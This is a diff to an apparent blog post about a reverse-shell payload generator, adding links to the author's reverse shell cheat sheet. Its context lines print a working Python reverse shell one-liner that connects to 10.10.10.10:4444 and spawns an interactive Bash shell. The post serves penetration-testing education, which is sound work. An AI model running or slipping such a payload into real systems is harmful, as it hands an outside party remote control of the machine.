@@ -89,7 +89,7 @@ The largest tab, with 72 payloads across Bash, Python, Perl, PHP, Ruby, PowerShe
 python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.10",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/bash","-i"])'
 ```
 
-Having ten language options matters in the field: the target may not have Bash, but it almost certainly has one of Python, Perl or PHP installed.
+Having ten language options matters in the field: the target may not have Bash, but it almost certainly has one of Python, Perl or PHP installed. If you prefer to copy the one liners by hand, my [Reverse Shell Cheat Sheet](https://benjitrapp.github.io/attacks/2022-09-03-reverse-shell-cheatsheet/) collects the same payloads in a single page.
 
 ### Bind Shells
 
@@ -272,6 +272,7 @@ The result is a tool that does one job well: turn an IP, a port and a target lan
 
 ## Further Reading
 
+- [My Reverse Shell Cheat Sheet](https://benjitrapp.github.io/attacks/2022-09-03-reverse-shell-cheatsheet/) — the companion reference on this blog for the manual one liners
 - [RaccShells Live Tool](https://benjitrapp.github.io/RaccShells/)
 - [Source Code on GitHub](https://github.com/BenjiTrapp/RaccShells)
 - [MITRE ATT&CK T1059 — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
